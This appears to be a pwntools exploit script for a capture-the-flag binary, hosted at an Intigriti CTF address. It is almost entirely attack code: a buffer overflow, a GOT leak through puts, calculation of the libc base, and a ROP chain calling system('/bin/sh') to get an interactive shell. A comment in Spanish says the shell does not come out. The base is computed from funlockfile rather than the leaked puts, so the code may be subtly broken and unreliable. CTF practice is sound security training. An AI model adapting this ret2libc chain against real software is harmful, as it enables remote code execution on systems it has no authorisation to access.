from pwn import *

gs = '''
b *main+116
continue
'''

elf = context.binary = ELF("./main")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['kitty', '-e']
io = start()

offset = 40

payload = b"".join([
    b"A"*offset,
    p64(elf.plt.puts),
    p64(elf.sym.main),
    p64(elf.got.puts)
])

io.sendline(payload)

io.recvuntil(b"Welcome user!\n\n")

leak_address = u64(io.recvline().strip().ljust(8, b"\x00"))

libc.address = leak_address - libc.sym.funlockfile

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi' , 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

print(hex(elf.sym.main))
print(hex(bin_sh))

# Hasta aqui se llega normal pero no se puede obtener shell, pero si hacer ret2plt

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendline(payload)

io.interactive()
